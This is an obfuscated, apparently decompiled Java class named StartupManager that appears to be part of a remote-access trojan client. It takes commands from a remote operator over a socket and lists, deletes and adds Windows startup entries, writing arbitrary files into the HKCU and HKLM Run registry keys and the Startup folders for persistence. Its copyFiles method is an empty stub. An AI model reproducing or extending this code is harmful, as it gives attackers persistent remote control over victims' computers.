package carLambo;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;

public class StartupManager {
   private OutputStream sdfsldf;
   private boolean sabretb = true;
   private Socket dfhttegd;
   private InputStream bsgshsbs;

   // $FF: synthetic method
   private void sdfsldf(String var1) {
      String[] var8;
      if (!(var8 = var1.split("\\^"))[1].startsWith("HKCU") && !var8[1].startsWith("HKLM")) {
         File var9;
         if ((var9 = new File(var8[1])).isDirectory()) {
            File[] var3;
            int var10 = (var3 = var9.listFiles()).length;

            int var4;
            for(int var10000 = var4 = 0; var10000 < var10; var10000 = var4) {
               File var5;
               if ((var5 = var3[var4]).isFile() && var5.getName().startsWith(var8[0])) {
                  var5.delete();
                  return;
               }

               ++var4;
            }
         }

      } else {
         try {
            String var2 = (new StringBuilder()).insert(0, "cmd /c reg delete ").append(var8[1]).append(" /v \"").append(var8[0]).append("\" /f").toString();
            Runtime.getRuntime().exec(var2);
         } catch (IOException var7) {
            try {
               this.sabretb("showdialog|Failed to delete item from startup");
            } catch (Exception var6) {
               Logger.getLogger(StartupManager.class.getName()).log(Level.SEVERE, (String)null, var6);
            }
         }
      }
   }

   public static boolean sdfsldf(String var0, String var1) {
      File var2;
      return (var2 = new File(var0)).exists() && var2.isFile() ? sabretb((new StringBuilder()).insert(0, "\"").append(System.getProperty("java.home")).append(File.separator).append("bin").append(File.separator).append("javaw.exe\" -jar \"").append(var0).append("\" ").append(var1).toString(), var2.getName()) : false;
   }

   public static String sdfsldf() {
      String var0 = "";

      try {
         ProcessBuilder var1;
         (var1 = new ProcessBuilder(new String[]{"cmd.exe", "/c", "wmic /node:. /namespace:'\\\\root\\cimv2' path win32_startupcommand get name,location /format:list"})).redirectErrorStream(true);
         StringBuilder var2 = new StringBuilder();

         try {
            Process var4 = var1.start();
            BufferedReader var12 = new BufferedReader(new InputStreamReader(var4.getInputStream()));

            String var3;
            while((var3 = var12.readLine()) != null) {
               if (!var3.equals("")) {
                  var2.append(var3 + "\r\n");
               }
            }
         } catch (IOException var10) {
            var10.printStackTrace();
         }

         String[] var16 = var2.toString().split("\r\n");
         int var13 = 0;
         String var14 = "";
         String[] var15 = var16;
         int var17 = var16.length;

         for(int var5 = 0; var5 < var17; ++var5) {
            String var6 = var15[var5];
            if (var13 == 2) {
               var13 = 0;
               var0 = (new StringBuilder()).insert(0, var0).append(var14).append("|").toString();
               var14 = "";
            }

            String var10000;
            label63: {
               if (var6.toLowerCase().contains("location")) {
                  label82: {
                     ++var13;

                     try {
                        String var7;
                        if ((var7 = var6.split("=")[1]).equals("Startup")) {
                           var7 = ConnectionUtil.sdfsldf(7);
                        } else if (var7.equals("Common Startup")) {
                           var7 = ConnectionUtil.sdfsldf(24);
                        } else if (var7.startsWith("HKU")) {
                           var7 = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
                        } else if (var7.startsWith("HKLM")) {
                           var7 = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
                        }

                        var14 = (new StringBuilder()).insert(0, var14).append(var7).toString();
                     } catch (Exception var9) {
                        break label82;
                     }

                     var10000 = var6;
                     break label63;
                  }
               }

               var10000 = var6;
            }

            if (var10000.toLowerCase().contains("name")) {
               ++var13;

               try {
                  var14 = (new StringBuilder()).insert(0, var6.split("=")[1]).append("^").append(var14).toString();
               } catch (Exception var8) {
                  var14 = (new StringBuilder()).insert(0, "^").append(var14).toString();
               }
            }
         }
      } catch (Exception var11) {
         ;
      }

      return var0;
   }

   public static void copyFiles(File file1, File file2) {

   }

   // $FF: synthetic method
   private void sabretb() {
      while(true) {
         try {
            if (this.sabretb) {
               StartupManager var1 = this;
               byte[] var2 = new byte[1];
               StringBuilder var4 = new StringBuilder();

               do {
                  int var3;
                  if ((var3 = var1.bsgshsbs.read(var2, 0, 1)) == -1) {
                     throw new RuntimeException();
                  }

                  var4.append(new String(var2, 0, var3));
               } while(!var4.toString().endsWith("\r\n\r\n"));

               String var7 = var4.toString();
               String[] var6;
               if ((var6 = this.sdfsldf(Integer.parseInt(var7.substring(0, var7.indexOf("\r\n\r\n")))).split("\\|"))[0].equals("reload")) {
                  this.sabretb(sdfsldf());
                  continue;
               }

               if (var6[0].equals("delete")) {
                  this.sdfsldf(var6[1]);
                  this.sabretb("showdialog|Item successfully removed from startup");
                  continue;
               }

               if (!var6[0].equals("add")) {
                  continue;
               }

               if (sdfsldf(var6[1], true, true)) {
                  this.sabretb("showdialog|Item successfully added to startup");
                  continue;
               }

               this.sabretb("showdialog|Failed to add item to startup");
               continue;
            }
         } catch (Exception var5) {
            this.sabretb = false;
         }

         return;
      }
   }

   // $FF: synthetic method
   private int dfhttegd() {
      byte[] var1 = new byte[1];
      StringBuilder var3 = new StringBuilder();

      int var2;
      try {
         while((var2 = this.bsgshsbs.read(var1, 0, 1)) != -1) {
            var3.append(new String(var1, 0, var2));
            if (var3.toString().endsWith("\r\n\r\n")) {
               String var4 = var3.toString();
               return Integer.parseInt(var4.substring(0, var4.indexOf("\r\n\r\n")));
            }
         }
      } catch (IOException e) {
         e.printStackTrace();
      }


      throw new RuntimeException();
   }

   // $FF: synthetic method
   private String sdfsldf(int var1) {
      byte[] var2 = new byte[var1];
      StringBuilder var4 = new StringBuilder();
      int var5 = 0;
      int var3 = var1;

      for(int var10000 = 0; var10000 != var1; var10000 = var5) {
         try {
            var3 = this.bsgshsbs.read(var2, 0, var3);
         } catch (IOException e) {
            e.printStackTrace();
         }
         var5 += var3;
         if (var3 == -1) {
            throw new RuntimeException();
         }

         var4.append(new String(var2, 0, var3));
         var3 = var1 - var5;
      }

      return var4.toString();
   }

   StartupManager(Socket var1) {
      try {
         this.bsgshsbs = var1.getInputStream();
         this.sdfsldf = var1.getOutputStream();
         (new Thread(new StartupThread(this))).start();
      } catch (Exception var2) {
         this.sabretb = false;
      }
   }

   // $FF: synthetic method
   static void listener(StartupManager var0) {
      var0 = var0;

      try {
         while(var0.sabretb) {
            StartupManager var1 = var0;
            byte[] var2 = new byte[1];
            StringBuilder var4 = new StringBuilder();

            do {
               int var3;
               if ((var3 = var1.bsgshsbs.read(var2, 0, 1)) == -1) {
                  throw new RuntimeException();
               }

               var4.append(new String(var2, 0, var3));
            } while(!var4.toString().endsWith("\r\n\r\n"));

            String var7 = var4.toString();
            String[] var6;
            if ((var6 = var0.sdfsldf(Integer.parseInt(var7.substring(0, var7.indexOf("\r\n\r\n")))).split("\\|"))[0].equals("reload")) {
               var0.sabretb(sdfsldf());
            } else if (var6[0].equals("delete")) {
               var0.sdfsldf(var6[1]);
               var0.sabretb("showdialog|Item successfully removed from startup");
            } else if (var6[0].equals("add")) {
               if (sdfsldf(var6[1], true, true)) {
                  var0.sabretb("showdialog|Item successfully added to startup");
               } else {
                  var0.sabretb("showdialog|Failed to add item to startup");
               }
            }
         }
      } catch (Exception var5) {
         var0.sabretb = false;
      }

   }

   public static boolean sdfsldf(String var0, boolean var1, boolean var2) {
      File var3;
      if ((var3 = new File(var0)).exists() && var3.isFile()) {
         if (var2) {
            dfhttegd(var0);
         }

         if (var1) {
            if (!var0.toLowerCase().endsWith("vbs") && !var0.toLowerCase().endsWith("js") && !var0.toLowerCase().endsWith("wsf")) {
               return var0.toLowerCase().endsWith(".jar") ? sabretb((new StringBuilder()).insert(0, "\"").append(System.getProperty("java.home")).append(File.separator).append("bin").append(File.separator).append("javaw.exe\" -jar \"").append(var0).append("\"").toString(), var3.getName()) : sabretb((new StringBuilder()).insert(0, "\"").append(var0).append("\"").toString(), var3.getName());
            } else {
               return sabretb((new StringBuilder()).insert(0, "wscript \"").append(var0).append("\"").toString(), var3.getName());
            }
         } else {
            return true;
         }
      } else {
         return false;
      }
   }

   // $FF: synthetic method
   private static boolean sabretb(String var0, String var1) {
      try {
         var1 = var1.substring(0, var1.lastIndexOf("."));
         WindowsRegUtil.invokeMethod(-2147483647, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", var1, var0, 0);
         WindowsRegUtil.invokeMethod(-2147483646, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", var1, var0, 0);
         return true;
      } catch (Exception var2) {
         return false;
      }
   }

   // $FF: synthetic method
   private void sabretb(String var1) {
      String var2 = String.valueOf(var1.getBytes().length + "\r\n\r\n");
      try {
         this.sdfsldf.write(var2.getBytes());
         this.sdfsldf.write(var1.getBytes());
         this.sdfsldf.flush();
      } catch (IOException e) {
         e.printStackTrace();
      }
   }

   // $FF: synthetic method
   private static void dfhttegd(String var0) {
      File var4 = new File(var0);
      File var1 = new File((new StringBuilder()).insert(0, ConnectionUtil.sdfsldf(7)).append("\\").append(var4.getName()).toString());
      File var2 = new File((new StringBuilder()).insert(0, ConnectionUtil.sdfsldf(24)).append("\\").append(var4.getName()).toString());

      try {
         copyFiles(var4, var1);
         copyFiles(var4, var2);
      } catch (Exception var3) {
         ;
      }
   }
}
